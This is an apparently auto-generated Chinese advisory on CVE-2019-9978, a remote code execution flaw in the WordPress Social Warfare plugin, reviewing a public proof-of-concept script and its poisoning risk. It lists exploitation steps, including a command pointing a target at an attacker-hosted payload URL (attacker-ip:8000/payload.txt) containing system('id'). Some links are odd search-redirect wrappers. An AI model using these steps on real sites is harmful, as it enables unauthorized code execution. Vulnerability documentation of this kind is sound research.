## CVE-2019-9978 - WordPress Social Warfare 插件 RCE/RFI/存储型XSS

**漏洞编号:** CVE-2019-9978

**漏洞类型:** RCE/RFI/存储型XSS

**影响应用:** WordPress Social Warfare 插件

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** < 3.5.3

**利用条件:** 无需身份验证，目标网站需安装受影响版本的插件并对外联网（用于加载远程Payload）

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

【POC有效性分析】该POC代码针对WordPress Social Warfare插件中存在的CVE-2019-9978漏洞进行了完整的复现实现。漏洞根源在于插件的admin-post.php处理流程中，swp_debug参数被设置为load_options时，系统会通过swp_url参数请求一个外部URL并将其内容传递给eval()或类似的执行函数（在某些版本中表现为通过PHP伪协议读取本地文件或加载远程Payload）。POC代码设计简洁且直观，使用了Python的requests库构建HTTP GET请求。关键点在于绕过了自动编码，通过urllib.parse.quote手动编码URL参数，确保payload_url能被目标服务器正确解析。脚本包含了自动化的漏洞指纹识别逻辑，通过检查返回结果中是否包含'root:x'（针对/etc/passwd读取测试）来判定RCE是否成功，具有极高的实战参考价值和有效性。在测试环境中，攻击者只需托管一个包含PHP代码的文本文件（如payload-main.txt），即可实现任意命令执行。【利用步骤】1. 攻击者准备一台公网可访问的服务器或本地测试机。2. 在该服务器上创建一个名为payload.txt的文件，内容为受害目标需要执行的恶意代码，如：<pre>system('id')</pre>。3. 启动HTTP服务（如：python3 -m http.server 8000）托管该文件。4. 攻击者执行POC脚本：python3 exploit.py [http://target-wp.com](https://www.google.com/search?q=http://target-wp.com) http://attacker-ip:8000/payload.txt。5. 目标服务器通过admin-post.php接口触发漏洞，拉取远程Payload并执行，结果回显至HTTP响应体中。【投毒风险分析】该POC项目的投毒风险极低，评分为5%。首先，代码逻辑完全透明，主要依赖Python标准库（sys, urllib.parse）和常用的requests库，未发现任何代码混淆或加壳处理。其次，POC的功能高度集中且单一，没有发现隐藏的外部C2连接、敏感信息窃取（如环境变量、SSH密钥上传）或在攻击者本地执行恶意指令的行为。Payload文件（payload-main.txt）仅使用了良性的'cat /etc/passwd'作为无害化验证手段，符合安全研究的标准规范。唯一需要注意的风险点是用户在下载并运行此类POC时，应始终在隔离的沙箱或虚拟机环境中操作，以防止在配置payload_url时因误操作导致的本地信息泄露。总体而言，该项目是一个纯粹的教育和防御性研究工具，未见恶意后门植入。

**项目地址:** [https://github.com/vulnwatchdog/CVE-2019-9978-RCE-PoC](https://www.google.com/search?q=https://github.com/vulnwatchdog/CVE-2019-9978-RCE-PoC)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2019-9978](https://nvd.nist.gov/vuln/detail/CVE-2019-9978)
